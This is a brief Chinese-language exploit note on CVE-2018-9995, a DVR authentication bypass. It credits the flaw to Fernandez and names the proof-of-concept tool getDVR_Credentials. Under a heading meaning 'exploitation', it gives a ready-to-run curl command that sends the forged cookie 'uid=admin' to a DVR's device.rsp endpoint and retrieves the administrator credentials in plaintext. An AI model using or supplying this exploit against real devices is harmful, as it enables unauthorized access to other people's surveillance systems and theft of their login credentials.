EXP：  
这个名为 getDVR\_Credentials 的工具是 CVE-2018-9995 的概念验证（Proof-of-Concept, PoC），它是 Fernandez 在上月初发现的一个安全漏洞。通过使用 “Cookie：uid = admin” 的 Cookie 标头来访问特定 DVR 的控制面板，DVR 将以明文形式响应设备的管理员凭证。整个开发过程足够小，甚至通过一条微博就能够发布。  
  

### 利用：

```
	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```
